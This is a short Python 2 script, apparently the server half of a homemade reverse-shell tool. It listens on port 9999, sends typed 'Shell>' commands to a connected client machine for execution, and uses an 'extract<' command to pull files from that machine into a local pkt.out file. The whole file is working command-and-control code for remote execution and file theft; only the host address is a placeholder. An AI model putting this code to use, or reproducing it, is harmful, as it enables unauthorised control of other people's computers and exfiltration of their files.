#!#/usr/bin/python
#server.py
#Author: Willie Cooley
#Description: sets up a connection and listens on specified port
#       for a connection from client. sends any commands to the
#       client machine to be executed, expects the output of the
#       commands returned...
#       extract<filename to transfer a file from the client machine
#           I.E. - extract<Documents/myFile.txt  

import socket
import sys
import os

#create a and bind to a socket
def create_socket(h, p, n, e):
    try:
        try:
            global host
            global port
            global server
            global nconn
            global exit
            host = h
            port = p
            nconn = n
            exit = e
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as err:
            print ("Error Occured: " + str(err))
        print("Binding socket to port " + str(port))
        server.bind((host, port))
    except socket.error as err:
        print (str(err))

# reads 1024 bytes at a time from the client, writing them to the file
# pkt.out, in the current working directory
def extract(conn, cmd):
    conn.send(cmd)
    path = str(os.getcwd()) + '/pkt.out'
    inFile = open(path, 'wb')
    while True:
        data = conn.recv(1024)
        if 'File not found' in data:
            print 'ERROR: File Not Found.'
            break
        if data.endswith('TRANSFER COMPLETE'):
            print 'Transfer Successful.'
            break
        inFile.write(data)
    inFile.close()

#listen for and establish connection with client
def establish_conection():
        print ("Listening for clients on port " + str(port))
        server.listen(nconn)
        conn, addr = server.accept()
        print ("Connection Established with " + str(addr[0]) + ":" + str(addr[1]))
        send_commands(conn, exit)
        conn.close()

#send commands to the client,
#special cases for user defined exit command and extract command
def send_commands(conn, exit):
    while True:
        cmd = raw_input("Shell> ")
        if exit in cmd:
            conn.send(exit)
            conn.close()
            server.close()
            break
        elif 'extract' in cmd:
            extract(conn, cmd)
        elif len(str.encode(cmd)) > 0:
            conn.send (str.encode(cmd))
            print conn.recv(1024)

def server_start():
    create_socket("XXX.XXX.XXX.XXX", 9999, 3, "XPLACEX")
    establish_conection()

server_start()
